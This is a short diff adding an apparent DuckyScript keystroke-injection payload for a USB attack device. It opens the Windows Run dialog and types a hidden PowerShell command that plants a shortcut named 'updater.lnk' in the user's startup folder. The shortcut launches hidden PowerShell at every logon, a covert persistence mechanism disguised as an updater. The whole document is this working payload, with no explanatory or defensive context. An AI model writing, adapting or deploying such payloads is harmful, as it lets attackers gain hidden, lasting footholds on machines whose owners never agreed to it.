@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -Command "& { $startup = [Environment]::GetFolderPath('Startup'); $lnk = (New-Object -ComObject WScript.Shell).CreateShortcut(\"$startup\updater.lnk\"); $lnk.TargetPath = 'powershell.exe'; $lnk.Arguments = '-WindowStyle Hidden -NoProfile'; $lnk.WindowStyle = 7; $lnk.Save(); Write-Host 'Startup item created' }"
+ENTER
